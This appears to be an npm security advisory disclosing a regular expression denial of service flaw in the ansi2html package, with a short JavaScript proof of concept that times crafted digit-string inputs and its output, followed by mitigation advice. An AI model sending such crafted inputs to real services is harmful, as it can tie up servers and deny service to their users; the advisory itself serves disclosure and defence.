summary: "Regular Expression Denial of Service in ansi2html\nThe `ansi2html` package is affected\
  \ by a regular expression denial of service vulnerability when certain types of user input\
  \ is passed in.\n\n\n## Proof of concept\n```\nvar ansi2html = require('ansi2html')\n\nvar\
  \ start = process.hrtime();\nansi2html(\"[1111111111111111111111;0000000000000000000000\"\
  );\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;00000000000000000000000\"\
  );\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;000000000000000000000000\"\
  );\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;0000000000000000000000000000\"\
  );\nconsole.log(process.hrtime(start));\n```\n\nResults of the above\n```\n00:29:53-adam_baldwin~/tmp$\
  \ node test\n[ 0, 119615367 ]\n[ 0, 149934565 ]\n[ 0, 233325677 ]\n[ 3, 46582479 ]\n```\n\n\
  \n## Recommendation\n\nAt the time of this writing, February 2018, all versions of `ansi2html`\
  \ remain vulnerable, and the package has not been updated for 4 years. \n\nIn order to use\
  \ this package safely, it is necessary to avoid passing user input to the package, or to limit\
  \ the size of the input string to a size with a parse time you find acceptable. Unfortunately,\
  \ the match time grows at quite a small character count, so it is unlikely for it to both\
  \ allow strings of a useful size while protecting against the denial of service attack. \n\
  \nIn the case that user input of significant length must be parsed by ansi2html, the best\
  \ mitigation is to use an alternative module that is actively maintained and provides similar\
  \ functionality. There are [multiple modules fitting this criteria available on npm.][available\
  \ on npm](https://www.npmjs.com/search?q=ansi+html)"
